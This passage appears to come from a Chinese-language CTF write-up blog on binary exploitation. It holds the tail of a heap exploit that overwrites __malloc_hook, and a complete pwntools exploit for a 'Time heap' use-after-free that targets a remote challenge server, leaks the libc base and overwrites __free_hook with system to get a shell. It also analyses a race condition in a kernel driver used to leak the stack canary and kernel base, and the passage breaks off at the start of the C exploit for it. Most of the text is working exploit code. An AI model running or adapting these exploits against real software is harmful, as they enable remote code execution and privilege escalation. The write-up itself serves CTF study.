data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to modify?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What do you want to input?&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to see?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 8</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 9</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 10</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 11</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 12</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x31</span>))  <span class="comment"># 13</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x3f0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span>+<span class="number">0x29000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 9</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(<span class="number">0x3f42a</span>+libc_base))  <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">0x3f42a</span>+libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xC5D)&#x27;)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r,&#x27;b*$rebase(0xC5D)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Time-heap"><a href="#Time-heap" class="headerlink" title="Time heap"></a>Time heap</h2><p>题目非常简单，存在很明显的UAF，这里就不再分析了，直接给exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./time_heap&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./time_heap&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10015</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, contents, remark</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(contents)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Remark: &#x27;</span>)</span><br><span class="line">    r.send(remark)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, contents, remark</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(contents)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Remark: &#x27;</span>)</span><br><span class="line">    r.send(remark)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x400</span>, <span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, flat([<span class="number">0</span>]*<span class="number">2</span>), <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span>+<span class="number">0x30000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook), flat(<span class="number">0</span>))</span><br><span class="line">create(<span class="number">0x400</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, flat(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="kernel-pwn2"><a href="#kernel-pwn2" class="headerlink" title="kernel pwn2"></a>kernel pwn2</h2><p>题目比较简单，就是普通的内核栈题</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">test2_write</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((<span class="keyword">int</span>)used + size) &lt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = size;</span><br><span class="line">    msleep(<span class="number">2000LL</span>);</span><br><span class="line">    v8 = (<span class="keyword">char</span> *)&amp;test2_buffer + (<span class="keyword">int</span>)used;</span><br><span class="line">    _check_object_size(v8, v7, <span class="number">0LL</span>);</span><br><span class="line">    copy_from_user(v8, a2, v7);</span><br><span class="line">    result = v7;</span><br><span class="line">    LODWORD(used) = v7 + used;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (<span class="keyword">char</span> *)&amp;test2_buffer + (<span class="keyword">int</span>)used;</span><br><span class="line">    v5 = <span class="number">0x100</span> - (<span class="keyword">int</span>)used;</span><br><span class="line">    _check_object_size(v4, v5, <span class="number">0LL</span>);</span><br><span class="line">    copy_from_user(v4, a2, v5);</span><br><span class="line">    result = v5;</span><br><span class="line">    LODWORD(used) = <span class="number">0x100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">test2_read</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))_fentry__)();</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &lt;= size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &gt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> ((__int64 (__fastcall *)(__int64))get_buf)(a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">int</span>)used &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = size;</span><br><span class="line">    LODWORD(used) = used - size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">0x100</span>LL);</span><br><span class="line">      BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(&amp;test2_buffer, size, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(a2, &amp;test2_buffer, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_buf</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v4[<span class="number">36</span>]; <span class="comment">// [rsp-120h] [rbp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v4[<span class="number">35</span>] = v2;</span><br><span class="line">  v4[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)used &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fortify_panic(<span class="string">&quot;memcpy&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> test2_read((__int64)<span class="string">&quot;memcpy&quot;</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(v4, &amp;test2_buffer, (<span class="keyword">int</span>)used);</span><br><span class="line">    msleep(<span class="number">2000LL</span>);</span><br><span class="line">    copy_to_user(a1, v4, used);</span><br><span class="line">    result = (<span class="keyword">int</span>)used;</span><br><span class="line">    LODWORD(used) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是驱动比较重要的三个函数。</p><p>在<code>get_buf</code>函数中会将全局变量的内容复制到栈上，然后再将栈上的内容发送给用户态。从头到尾其实看不出来什么问题，不过题目这里用<code>msleep</code>函数就已经算是明示存在条件竞争了。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>如果我们可以在<code>get_buf</code>中<code>memcpy</code>之后以及<code>copy_to_user</code>之前就可以泄漏出栈上的内容。</p><p>具体的办法就是两个线程分别write并且分别进入if内的代码块和else内的代码块，首先在<code>memcpy</code>执行之前进入else的代码块修改used的为0x100，随后在<code>copy_to_user</code>之前执行完if内的代码块，那么此时used为<code>0x100+size</code>，所以此时可以泄漏出canary和kernel基地址了。</p><p>有了上面泄漏的思路之后实现栈溢出也就很简单了这里就不提了</p><h3 id="综上，exp-2"><a href="#综上，exp-2" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 